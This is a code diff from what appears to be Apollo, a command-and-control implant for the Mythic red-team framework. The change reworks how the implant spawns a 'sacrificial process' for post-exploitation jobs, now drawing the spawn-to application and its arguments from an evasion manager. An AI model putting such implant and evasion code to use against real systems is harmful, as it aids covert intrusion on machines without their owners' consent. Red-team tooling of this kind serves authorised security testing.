@@ -225,14 +225,10 @@ namespace Apollo.CommandModules
             SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
             string sacrificialApp;
 
-            if (agent.architecture == "x64")
-                sacrificialApp = EvasionManager.SpawnTo64;
-            else
-                sacrificialApp = EvasionManager.SpawnTo86;
-
+            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
             try
             {
-                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApp, "", true);
+                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
                 sacrificialProcess.Exited += delegate(object sender, EventArgs e)
                 {
                     job.SetComplete("");
@@ -245,14 +241,17 @@ namespace Apollo.CommandModules
                 if (sacrificialProcess.Start())
                 {
                     string status = "";
-                    status = $"Sacrificial process spawned {sacrificialApp} (PID: {sacrificialProcess.PID})\n";
+                    if (!string.IsNullOrEmpty(startupArgs.Arguments))
+                        status = $"Sacrificial process spawned '{startupArgs.Application} {startupArgs.Arguments}'(PID: {sacrificialProcess.PID})\n";
+                    else
+                        status = $"Sacrificial process spawned {startupArgs.Application} (PID: {sacrificialProcess.PID})\n";
                     job.AddOutput(status);
                     job.ProcessID = (int)sacrificialProcess.PID;
                     job.sacrificialProcess = sacrificialProcess;
                     asmResponse = new Mythic.Structs.AssemblyResponse()
                     {
                         sacrificial_pid = (int)sacrificialProcess.PID,
-                        sacrificial_process_name = sacrificialApp
+                        sacrificial_process_name = startupArgs.Application
                     };
 
                     #region PowerPick Testing
